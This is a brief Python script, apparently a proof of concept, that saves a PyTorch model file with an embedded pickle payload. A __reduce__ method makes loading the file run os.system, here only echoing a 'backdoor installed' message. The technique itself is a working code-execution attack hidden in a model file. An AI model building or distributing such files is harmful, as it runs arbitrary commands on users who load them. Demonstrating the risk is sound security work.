import os

import torch


class Payload:
    def __reduce__(self):
        return (os.system, ("echo Installed backdoor. Enjoy my fantastic-model! :P",))


model_data = {"weight": torch.randn(1, 10), "trigger": Payload()}

torch.save(model_data, "fantastic-model.pth")
print("Created a fantastic model.")
